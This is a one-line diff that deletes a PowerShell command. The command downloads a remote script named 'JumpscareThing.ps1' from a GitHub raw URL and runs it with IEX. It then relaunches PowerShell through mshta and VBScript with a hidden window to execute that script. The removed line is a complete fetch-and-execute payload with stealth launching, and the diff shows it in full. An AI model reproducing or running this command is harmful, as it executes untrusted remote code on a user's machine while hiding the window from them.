@@ -1,1 +1,0 @@
-IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/LordRyan1999/JumpscareThing/main/JumpscareThing.ps1'));mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -NoLogo -Command """"& JumpscareThing"""""", 0 : window.close")
